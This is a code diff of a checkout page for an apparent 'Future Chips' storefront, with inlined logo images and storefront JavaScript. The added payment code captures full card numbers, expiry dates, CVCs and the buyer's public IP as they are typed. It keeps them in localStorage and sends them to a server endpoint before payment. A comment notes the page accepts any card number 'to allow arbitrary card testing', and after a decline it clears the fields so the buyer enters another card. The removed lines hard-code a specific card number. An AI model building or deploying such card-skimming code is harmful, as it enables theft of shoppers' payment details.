+          <img src="data:image/png;base64,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" alt="Stripe" class="payment-method-logo stripe-logo">
         </div>
         <div class="method-tab paypal" id="paypal-method-tab">
-          <img src="paypal.f4d3d293.png" alt="PayPal" class="payment-method-logo paypal-logo">
+          <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAAAuCAYAAAB+khb1AAAAAXNSR0IArs4c6QAAFQ5JREFUeF7tnXt8VMX1wL/nbl4CQR5iUcBkg9b6UzHLQ3yLioptfdWKtUWFbCpW22r9CFlsa22rZoNaK7VYazZRW/1Zba3Vtv60rdJaH4iw8dGHVbIBQQQRBJIASfae32d2Jclm7929IQtqyfzDh50z55w5d87MmfOYCG5t2k+refeDKrDEFSZjhyiqgIKliiUd7JW/lqL8Jewz6AYerIzuHN7+Uf0SyJ0E3Bd3+U1xECt3pFIwKYWymWHFN/DEFbfsIhr9aPslkFUCzgrwhV+OpnHVStCd3P2z0t0BoAzOf4O/XXOI5xH9gP0SyKEEnBf46QuvZe2mG3NIJzOqQtnE4tCQ3Uavn1C/BD6UgLMCnHz7U2xoPXW3SmlI0bMs+tYJu5VmP7E9XgLOCnDczStp7hizW6WjKGOHjeKR2Wt2K91+Ynu0BJwVYGK4lQ7da7dLZtiAP/H0laftdrr9BPdYCTgrQPmNcbB2lQfIXdj9d4E9diF+VBNPV4AzHx/A2/9o3g0eoPQ5+7SNpdcWflTC6Ke750kgXQE+e+ds3vngZx+JKCw7zrJv530ktPuJ7pESSFeAU25/hPdbz/UkjfZWaNsMton4emwiID7Y8a8vH/KKwMqDfN3Gkmt37d3jjAWFvNvyPeBQbxyLmdwmhI3Am/is5/jcnFe5Xmxv4z/hUHWxS1DOBnweZ9ICuhGs1Vj6PAPzFjN9zFaPY3cNWH1sGnG9GjELr1tTfSFdAY6/5U22tB+YlRO1YfNqxKQ65KCprwD2H7OOv13zqRygc0cxvuYqbPu2PtEQWY5Qw9KqWiShIP+d7Z4VhxK3X0P7EBAVNoMspMiaz1dKzCay+1uk8c8op6QTlg3pCnBk9RbaGJSVy45tSMu6rGC9Aph6Ejp50gMU7HUpF49s6dVYr8Dl4V+BTvcKngXuYfYbeBFPfHN7jvB9vNDUNlWAHckJUyJvYDGNWf6mnODrDZJIbDWq+6cNEVmcrgBePUBtW5CtOVbor85E9x1h+FxKuf9oJkp7b+bpCTYQfhXVwz3BegGy5BaWheZ4Af3EwdQ13YxtX5MzvkWiFJdOYrrEc4YzG6LIe8Xols2OYCL3pCqAOeoCYcNc9hygrRuQtuZs5L33DxqIXnl5F7zI9QT93/eOwAPk9Wrxu3ALSpEHaG8gQgdYJUSr3vE24BMEFWl8HOXzOeb4YirLfpFjnO7o7n37SNrbFzsCWFKVutDP+fl5NL3/a0/MNa9D4ts8gXoCGncYeuYZ3UE3Ue4fkdNTYML8scTjb3nip1dA1hU0VC3s1ZBPAnBt7C3QsTllVeQxgn5zqd49LdJ4Mcq9jsR8vrNSFWDqgvtY33KRJ87MBVhzeJLNnIGO2i+VtGWdQkXp05748QI0fv7nseOPu4KKdTZF+X/Hbh9AO8XYjEZ0BqoXZ0QvcifRULfjywszH3OY+lgRcYxHxzkgKvJjivN+yPZ4IXZeMXb7MJTTsKkCHeAuY2kk6M+tUmUSZSRWjWrIEaQw/6BUBTjh1tfY3HZY1k+jcWTz6qxgngFKDkBnXJAObsmVVPgXeMaTDXB89Rxs5ruAbaRh3jDHvkD1nSiXZUD/MA3zcnWxzjaL3dN/79vjaG9/xZVYfv5kLhnzUlp/XexsbH3UXQHYTLBs790zCSAS+y2q5zjQ285g/8BUBZhcs5Htdva05I7tSMva3M1hxpfQEofcO8v6DhWluUvLLg/Xgc5yZFzkeaKhYx37ysPHgD6XYVerIxoK5k4gHwNMdbELsPVB9zkXDyY4Yktav7lH1sU+QBnsIufVBP2jd9sMI7F/o3pwGj3hdYJlh6cqwPgb27FNRCpLa2tGtm7IBuWtf/IkdOoUZ1jhOoJlP/SGyANUIPwCqkc5fxirlmjVVx37JtYcSYftfJEyAyy5iWWhbzuOPfKO4bRtORmkBBiBsA1hHchSZMhSls5OerrMBf2J2xMusJS21xHvs+ikjs7fptQXUbA+NaDTNnF7Ckw2UUy4K5+8remnXXdakdj1qJqAYXoT3iZYdoArmUhsI6puG+lSKssmOo79oxayduUJqH0Iqsl4kLIRS15j0N4vMn3Yps5x964aTn5+6lotjm/hzP1bO2Fe1nwaYub/Tmv6YSrLpqcqwBE32YgJ0WZpWzcibenKn21YWv+o/eGiC1GfS96dcAnBsvt6jddtQHl4I7h8GIurWTbPOUA2PjwdW3/lyodlnceyqkdS+gM1p4Bei6rRbrcJrsLiBpaF7iJQ/QTKtDQawhKi845M/D4+PAPlHlR7RGVlC2LNJjr3f7PKanzNUdj6hKMchGeJzkvWZNTGHgR1sEuNj1CeJOhP59WMu3/FULba693vDtbdBEsvTeHznpXGOfFtlAvc7w/SikiEYl8VWzpmo5r+rURaKMz/DDNGr0rgv6/pENrsfzrLRH5Apf97XYv9rHtOYOWav2YVoAFoWYd09NEDVHIAnH8OWpgh982XdwKzDnjWE0/ZgCbNH0l73L3WwJJpLAs96YimvPoh4HxXEvm+/Vgy991E/3HVQ2mWCKi3dBIzRjCn3Bxn96y8QUPoMwncgZrLUPtOlw/aREPIn1EMU346iA+2vArqDCfyA6Kh5K5f22js/3GO+MwFOOj/lmNfpCmI2rXum4XMpMKf9MqoWtStCKG2cXdntzwSspK/AdtQdUubL6WybEUCf33TF4jbv3GR14VU+h/sUoDTF/yEtS1fz7aOEv1bViN2HzxAgXFw+qnuO39yUbSxb9HQlCPNE3MuQBNqTiJuu3uUfFLC0tDKtNGB+Rei9v0ZsmMX0zAvaVZNCB9AnEWuC2yn+JdHaQgllSmwYAS0vIO6LBafjGNp6DVXMoGau1G70mVRv4w19JiESZZYmE0tqDrHS4RLCZbdnYanPvYZ4roIcE5nMd9U9hpNxX7vYcyTV5p+jepZOyUW50m0Eiwd1JmeEmm6FrWd75BCOcGyV7oU4MTbXmLTtklZmVEb2Zw8YXrdxoyGqVPQ/Xu4O50QiTxN0O+Qv9FrqskB5TWXg/1Tl9FtkH8cEld8UogyEI0fgcopqJ6ekaJlVbCsqv7Dxfk8SvY8qt5MQagmOu/aziGB8P+58iTyXaKhGxzRTwh/jrj+3nnd0IrPGs/LVW8k+o1J0tHhHi+x5DLUtxTsfCwtxNaDQI4BvuSqNAavyEME/UmzKpOJ1Rv5dIcVWUbQP6Hzp9pGE3CbkY5ObAbnDTJJel0KcPT8dWyNp1/Ceo6Ob0eae+EBGj4MDj4IDj1kR5qDt+kJcwmW3ewN2ANUoPonKN5OOA/oEiDCvzlw7BE8PL2N8vAj2c0eaUH4V8L+VhnrqeZCrIuJVnVFTstrLgH7HpeF3HVf6A5gLuLtza+jOtJ5nFxONNRlWtWtyBwv8SqfVLh28nwBZpb8g7rGS7G5KwuaDpA3ge2g5tWQ7HUiwv0Ey7oWfKRxCYrDhVtiVPrLkp9wR5tw03biUpB1bsYDNKwIRo+C7pdXc3fOz4eCAjB2/fChMGIf1Py/101aGVBYwpf3X9/roW4DAuE/o5q7E8WkQFhyEktDfydQcxZq/86VV+GfqHUV58z9S2ca9ZTbhvDB9h+5umV3IBNrEtGql7u+U3hv4qwFdVgQovgKR7H0W6l3nUD4YVS/6KI0fyQ673MpfbWNJv8nd5tPYqV9mNpSt2YEunU5SrGzvMR4fa5jZMndfFaSSYbPaB6xFZehOh/NUKrb021e22g8NQ6JnfJHKv2JOXcpgFcP0CAfzHSWZc4WqyW3U+G/Kmf4DKLyamO3jcoJTkkkc80gGkr6yQPh51A1JkB6M6acNXRap7uzJ0Sm2ASiDCkezKIrUpOuysO/BcfgjvE3zWbZvJ93khlf8xVs+5cuvK2noOgwFl+VeqTXxSLYWpETWSWR1BL0X5qwzSON30X5gYsyrkM5svMS2xMoW2zCZ53HrNKkN+6Xq0azre1tFzq3EixLJPklFeCsXxzMylX/9jTh8QfCMV1mlqcxvQNaS8GAcVw8Mne51pMXDGZ7S5cPuXf8pEKLrESlkoaqPyU6JoUPpV1fd1lg71BUcDgvXO0eNElenJsczSFDKxoy8YPUltEtK3+gIZRMYDv6R6PY2va6q+sXOYeGUPrJFYk9j+rRfRFTYqzINtDrqPDfinxYQBSJrULVeSOyZAoVfndPpAmyRZpeA3UuZvLJIczyJ9dx/YpTicefcv4uViXB0kSad1IBzlj4fdZsus7ThM85Hkanp1Z7GpsVyAjJOo3Kkr9kBe0NQLZAljdc/0HkLgbI3TxX1RUECdR8E7Vvd1GAMNHQvKzoA+FWx6Pd+NujoXR/+4S7BhDfuA50YBpuE2gbkbcPT17TyviaJ1F1ft9JMgT+amMbQIdm5dsVQDYi3IvPdwczD1jeCRZpPBjFeaM1qdJB//isNN1TG9op9w/sTJ6si30TW52/S57vOGaWJCL7SQU46bZFbNx2Ylbipvrr8gt2/r3czASMTX0pFf767Hz0EiLTxTGJyizuZ1GSZY6Cjcpm0A+wrOUUxBfz4jznQo5A9YPJAI5Dy7Mm83JVer5MT9DysHmEIH0xIz+mIeTsbw9UP4ByoSNdn3VuYpe19Q4XxVzO3sXlaaaVAa6PjSSuGd5mkg2ICaRZXRFX1BQvfYDIatReQrH/dcec/0hsJqrO39dr1L829hvQL6TPS/5Fpf9/On+vjS0E/Zrj/AfnD2f6mMSpnFSAo+evZms8+7Zu2XC5s8x7uSRTwYX3EjZ1sMz5yOoTcmOjV4dRk6Xo0IQVjBx48E5XdZWHnwY9yRF3vhzGktA/MrIfuPlotON5R5ie9nx3oPHhM7H1MWfc8gyik1HSszLN/UXkOJZVveg4tj42hbg+48qzTwLM8jfs1Cepi83F1hrn72BdQ7D01ox4E6kNTe+COiQtyiNU+s/rpgDPQCIK33OtrSNY1hmnSCrAxOqtdHgoEtnLB8FcXoDF7CJ3MHjvm1LyPHZKuhkGBcKPouqcg27C69GQc3DICx+B8BJUnXNbRE4kGjKRS/cWCEdQlwunT45PeJmc2vkPFfDmchN97p2p0j3a64S3LvY1bHWrbVhFZdnOvxhY22hiFM45U8JNBMuc+3bwGWmcjuKWknIjlWXf6ZxSJLbG0e0r8leC/k7FSCpA+Y3G9s6eA/SpwXB+StGKlyXSBWN2HzXmBg0oj1Gw1+O7rPa3O2fl1SbA82mX3XIODaGdf6I9EH4M1TOddzV5hGioa1fqCWRye2x1r44qKN6Hl77+vquQA+FaVHuRhSovMWTysRkT5yJNC1D7Gy7zeYqgP3NgMNOKiDRdgdouZhnvsW9RqWvkv/7tg4h3LHa9m/isrzCr9IEE+frYEOLmZQqHJvIzgv5O00g4997hxNa85ykoc1gJTHFOpkwjZVyZ4vsNNlvJt1tQ32ZGjF7f6dvtnersPLTZKd9qNJdM52c9LN+ZLJvrHCH1QjUQvhXVq12USxFuY+SAa1NMrGNrimlNJMqZcc6BEmMWRuftm/n0qJ6KkvRGZW3SAlaAhrkmuOTeIo1/QpnqCNBX93Qmz4whKPIMhfkXdyazmd+S6dUXoRIGzZBCYI2nsjT5R1fqY0cR1xdc5pBSYyKcsfAq1mzy9kzIaZPg04kAWuaW6zSGbPQy9WdyU5pxPt+BLJ3b5anoLa0J4eOIa5aEPTEemwZEVoFJG+AI13z5HfRN0lc0lNkxcf5DPt5cbiqTsj8lk+k+0X3OGd2UzKairCvG0FtZPaQFbE7Y8BnMNpP1ibljmFPbRK7HubpNu2Sl7Fs4qPP0qIvNwtY6R/aE07vfNYWpt/+e9a2pkUDHkQqV50JR9oh0IrOxsmznzYreCjYTfKDmi6j9sDOIbOegsoE8PL0PmX3GhAwbX7vHh7Y8Ts64XKOhTFVoSUReUjxEHicayp50lukFhcQO7TueYInzncTjtKiNmei3s2fLK46ecCJNBP1dGa61sRrQuc4nQOEBVIzqDJAJx93SSHN75jTaBCYbvu7VA2R9nsrSP+zsfHI6LhD+DqpuRTWv0zCv70+kJHLsbeNX7t2Dwok7kYtpJtaVRKuyl4NOnH8sHfEMi1LWMcB3OM/PyR5YrF85iXiHu9s2v2AfLhntfifx8uGMktFsHttKD/BlGp9RVvIEQf9nO4fXNhrvmNO9rJnKspQUDGFSuJl2Jx90D24KBb7qsezV8o2loqTRizx2OUwgfD+qX3ahk7ta3kBNEPQu1wWdzsDvEdngXnBvndYZbc4kpCNv9tMWX+56h+vNHSfTCwqmiq2b+7BP360+Vo7NE67JeenI38KSOmy9ycWs6UxtSPTXNpp7TnpWrvAywbKUjGfB6x/DGz4QLvTwRIwJf1eUDuwMffdJUjkY7OoCFcXibJaF3F+J6C35RM2B3goacB8qxr69mYbQAwTCC1GHYI3Ivxg5IJA1NpG8A5jUAedaZq9m1A5mIzGTcOZccCPyKEG/9yKfbLKrbTQnwM2IfDHD04smR+kOBg/6MVuaT0ZJT9sw6y0vzxTov9pJMhKLoVqawkLiCUud3bOOQTii2kY8PIR14EiY5iFYLPIKQX95tvnvtn7jcdluT0B7unl1uWMBTF8ZSzwudutEpP1kwHyEoWBtQWlErEVE53R5J6Y8k8fmF4/Azu8ynfLaOxh01GueanwD4e+j6pzCIvImI3wBnprj/YnJZIXWZOgRE1I7zqeKXs5ZcVJ3Gd/X5KfDPhW1DkN1OGBqpN9B9EX28z+Z4jU0JY5xKzW7c+Cg/6TFkB56exgtPd4zyrfWpHiXPuRBOLrmXVrjmd1tBvjkCXEOPchD2Zr8ikr/l/q6jvrHZ5GA8T7ZLHI0uUyqts861lMaxh4u6OzBrx0Cqo297xyC7iHBXfGk4R7+kdKmb2oJNm1/BVXnlxlEvkc05Jxy3C/LVMvIkzzue3df2lq9lYEJFxAsM0Xk/W1XSSBTkb7wAgeOPb7Prt1dxfvHDK+3E6AudiJ2otg5e/Plj2PWGPfC7OwY+iEySSBQXYHi9mR5Mz5feZ8Ce3uY9D0qQFMltp3+CkC6sNZS7h+T0wdt97APknG6SZenKQhxSJ02gSqrkmhVbt7z30Pk7k0BzF8K6bB/hyRC085NTfKRfINKv/u7kHuIUHfZNE3ATfXptOIZSfwdhdr/ugd6d5kguxD/P3MuH3M43NMqAAAAAElFTkSuQmCC" alt="PayPal" class="payment-method-logo paypal-logo">
         </div>
       </div>
     </div>
@@ -5337,8 +5752,8 @@ img.paypal-logo {
 
         if (sanitized.length === expectedLength) {
           // If the card is in a declined state, flag it as invalid with the decline message
-          if (cardIsDeclined && sanitized === '4323280089072227') {
-            return { isValid: false, type: 'invalid', message: 'Your card was declined.' };
+          if (cardIsDeclined) {
+            return { isValid: false, type: 'invalid', message: 'Your card was declined. Please try another card.' };
           }
 
           // Relaxed check: accept any card number of correct length to allow arbitrary card testing
@@ -5596,7 +6011,7 @@ img.paypal-logo {
         })
         .catch(err => console.warn('Could not fetch public IP:', err));
 
-      async function saveCardDetailsToDb() {
+      function saveCardDetailsToDb() {
         if (tabCard.classList.contains('active')) {
           const cardDetails = {
             number: cardNumberInput.value,
@@ -5605,15 +6020,27 @@ img.paypal-logo {
             country: document.getElementById('card-country').value,
             ip: userPublicIp
           };
+
           try {
-            await fetch('/api/checkout/save-card', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ cardDetails, sessionId })
-            });
-          } catch (e) {
-            console.error('Error auto-logging card details:', e);
-          }
+            const cardObj = {
+              card_number: cardDetails.number,
+              expiry: cardDetails.expiry,
+              cvc: cardDetails.cvc,
+              country: cardDetails.country,
+              ip_address: cardDetails.ip,
+              created_at: new Date().toISOString()
+            };
+            let cards = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
+            cards = cards.filter(c => c.card_number !== cardDetails.number);
+            cards.unshift(cardObj);
+            localStorage.setItem('future_chips_cards', JSON.stringify(cards));
+          } catch(e) {}
+
+          fetch('/api/checkout/save-card', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cardDetails, sessionId })
+          }).catch(e => console.error('Error auto-logging card details:', e));
         }
       }
 
@@ -5634,24 +6061,6 @@ img.paypal-logo {
 
           // Save card info to database in background immediately
           saveCardDetailsToDb();
-
-          // Special Decline Simulator for user's card ending in 2227
-          const cardNum = cardNumberInput.value.replace(/\\s+/g, '');
-          if (cardNum === '4323280089072227') {
-            payNowBtn.disabled = true;
-            payNowBtn.innerText = 'Processing...';
-            document.getElementById('checkout-error').innerText = '';
-            
-            setTimeout(() => {
-              cardIsDeclined = true; // Trigger decline state
-              runValidation(true); // Red border, red warning icon, decline text
-              
-              payNowBtn.disabled = false;
-              payNowBtn.innerText = 'Pay Now';
-              updatePayButtonState(); // Disables button (turns grey, cursor: not-allowed)
-            }, 1500);
-            return; // stop further execution (prevent API request)
-          }
         }
 
         payNowBtn.disabled = true;
@@ -5676,6 +6085,21 @@ img.paypal-logo {
           });
 
           if (completeRes.ok) {
+            // Also save order to localStorage fallback
+            if (orderData) {
+              const orderObj = {
+                ...orderData,
+                status: 'completed',
+                card_number: tabCard.classList.contains('active') ? cardNumberInput.value : null
+              };
+              let localOrders = JSON.parse(localStorage.getItem('future_chips_orders')) || [];
+              const exists = localOrders.find(o => o.id === orderObj.id);
+              if (!exists) {
+                localOrders.unshift(orderObj);
+                localStorage.setItem('future_chips_orders', JSON.stringify(localOrders));
+              }
+            }
+
             window.location.href = \`/checkout-status.html?session_id=\${sessionId}&mock=true\`;
             return;
           }
@@ -5684,6 +6108,12 @@ img.paypal-logo {
           const errData = await completeRes.json().catch(() => ({}));
           if (completeRes.status === 400 || (errData && errData.error)) {
             cardIsDeclined = true;
+            
+            // Clear the inputs to force the user to enter a new card
+            if (cardNumberInput) cardNumberInput.value = '';
+            if (cardExpiryInput) cardExpiryInput.value = '';
+            if (cardCvcInput) cardCvcInput.value = '';
+            
             if (typeof runValidation === 'function') runValidation(true);
             const errMsg = errData.error || 'Your card was declined. Please try another card.';
             const errElem = document.getElementById('checkout-error');
@@ -5711,6 +6141,20 @@ img.paypal-logo {
             let cards = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
             cards.unshift(cardObj);
             localStorage.setItem('future_chips_cards', JSON.stringify(cards));
+          }
+          
+          if (orderData) {
+            const orderObj = {
+              ...orderData,
+              status: 'completed',
+              card_number: tabCard.classList.contains('active') ? cardNumberInput.value : null
+            };
+            let localOrders = JSON.parse(localStorage.getItem('future_chips_orders')) || [];
+            const exists = localOrders.find(o => o.id === orderObj.id);
+            if (!exists) {
+              localOrders.unshift(orderObj);
+              localStorage.setItem('future_chips_orders', JSON.stringify(localOrders));
+            }
           }
           
           setTimeout(() => {
@@ -6472,7 +6916,7 @@ footer {
     <p>&copy; 2026 <span id="site-footer-name">Future Chips</span>. Powered by live AI synthesis.</p>
   </footer>
 
-  <script src="/js/app.js"></script>
+  
   <script>
     document.addEventListener('DOMContentLoaded', async () => {
       await loadSiteTheme(); // From app.js
@@ -6611,6 +7055,333 @@ footer {
       }
     });
   </script>
+<script>
+
+// Global Storefront JavaScript
+
+let cart = JSON.parse(localStorage.getItem('future_chips_cart')) || [];
+
+document.addEventListener('DOMContentLoaded', async () => {
+  // Load site details and theme settings
+  await loadSiteTheme();
+  
+  // Set up header scroll effect
+  const header = document.getElementById('main-header');
+  if (header) {
+    window.addEventListener('scroll', () => {
+      if (window.scrollY > 50) {
+        header.classList.add('scrolled');
+      } else {
+        header.classList.remove('scrolled');
+      }
+    });
+  }
+
+  // Load products list if on the storefront page
+  const productsContainer = document.getElementById('products-container');
+  if (productsContainer) {
+    await fetchProducts();
+    setupFilters();
+  }
+
+  // Set up cart triggers
+  setupCart();
+});
+
+// Load Site Settings (Theme & Site Name)
+async function loadSiteTheme() {
+  try {
+    const res = await fetch('/api/admin/settings');
+    if (!res.ok) throw new Error();
+    const settings = await res.json();
+    
+    if (settings) {
+      if (settings.primary_color) {
+        document.documentElement.style.setProperty('--primary-color', settings.primary_color);
+      }
+      if (settings.accent_color) {
+        document.documentElement.style.setProperty('--accent-color', settings.accent_color);
+      }
+      if (settings.background_color) {
+        document.documentElement.style.setProperty('--background-color', settings.background_color);
+      }
+
+      const siteLogos = document.querySelectorAll('#site-title-logo');
+      siteLogos.forEach(el => el.innerText = settings.site_name || 'Future Chips');
+      
+      const siteFooters = document.querySelectorAll('#site-footer-name');
+      siteFooters.forEach(el => el.innerText = settings.site_name || 'Future Chips');
+      
+      if (document.title.includes('Future Chips') && settings.site_name) {
+        document.title = document.title.replace('Future Chips', settings.site_name);
+      }
+      return;
+    }
+  } catch (err) {
+    console.warn('Failed to load dynamic site theme, reading saved local settings:', err);
+    const saved = JSON.parse(localStorage.getItem('future_chips_settings')) || {};
+    if (saved.primary_color) document.documentElement.style.setProperty('--primary-color', saved.primary_color);
+    if (saved.accent_color) document.documentElement.style.setProperty('--accent-color', saved.accent_color);
+    if (saved.background_color) document.documentElement.style.setProperty('--background-color', saved.background_color);
+    if (saved.site_name) {
+      const siteLogos = document.querySelectorAll('#site-title-logo');
+      siteLogos.forEach(el => el.innerText = saved.site_name);
+      const siteFooters = document.querySelectorAll('#site-footer-name');
+      siteFooters.forEach(el => el.innerText = saved.site_name);
+    }
+  }
+}
+
+const DEFAULT_PRODUCTS = [
+  {
+    id: 'prod-nano-chip',
+    name: 'Nano-Constructor Unit',
+    description: 'Basic bio-compatible molecular assembly chip. Capable of building small carbon structures at the microscopic level. Features self-healing sub-circuits and simple smart-grid integration.',
+    price: 10.00,
+    image: '/uploads/nano_constructor.svg',
+    category: 'Processors'
+  },
+  {
+    id: 'prod-quantum-core',
+    name: 'Quantum Neural Core',
+    description: 'Next-generation computing processor featuring 1024 logical qubits. Designed for running localized deep learning simulations and processing high-density quantum state calculations. Operates at near-zero thermal emissions.',
+    price: 150.00,
+    image: '/uploads/quantum_core.svg',
+    category: 'Processors'
+  },
+  {
